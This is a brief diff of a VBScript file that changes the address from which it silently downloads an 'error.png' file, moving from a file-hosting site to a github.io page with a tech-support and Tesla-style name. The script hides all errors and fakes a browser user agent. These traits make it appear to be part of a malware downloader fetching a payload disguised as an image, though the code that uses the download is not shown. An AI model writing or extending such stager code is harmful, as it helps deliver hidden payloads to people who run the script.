@@ -33,7 +33,7 @@ Dim httpImg
 Set httpImg = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 
 On Error Resume Next
-httpImg.Open "GET", "https://files.catbox.moe/8m1m6f.png", False
+httpImg.Open "GET", "https://techsupportservices.github.io/Tesla-Products-/error.png", False
 httpImg.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
 httpImg.Send
 
